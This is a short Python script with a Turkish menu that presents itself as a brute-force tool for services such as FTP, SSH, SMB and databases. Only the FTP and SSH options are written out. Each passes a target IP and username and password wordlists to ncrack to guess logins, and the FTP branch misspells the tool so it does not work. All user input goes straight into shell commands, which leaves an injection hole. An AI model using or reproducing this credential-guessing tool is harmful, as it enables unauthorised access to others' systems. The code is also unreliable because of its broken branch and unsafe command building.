#!/usr/bin/env python 
import os

os.system("apt-get install figlet")
os.system("clear")
os.system("figlet KABA KUVVET")
print("""
Kaba Kuvvet Aracina Hosgeldiniz.

1) FTP 
2) SSH
3) Telnet
4) HTTP
5) SMB
6) ROP
7) SIP
8) Redis
9) VNC
10) PostgreSQL
11) MySQL
""")

islemno = raw_input("Islem Numarasini Giriniz: ")
hedefip = raw_input("Hedef Ip Giriniz: ")
kullaniciadi = raw_input("Kullanici Adi Dosya Yolu: ")
sifre = raw_input("Sifrenin Bulundugu Dosya Yolu: ")

if(islemno=="1"):
		os.system("nrack -p 21 -u " + kullaniciadi + " -P " + sifre + " " + hedefip)
elif(islemno=="2"):
		os.system("ncrack -p 22 -u " + kullaniciadi + " -P " + sifre + " " + hedefip)

 
		 
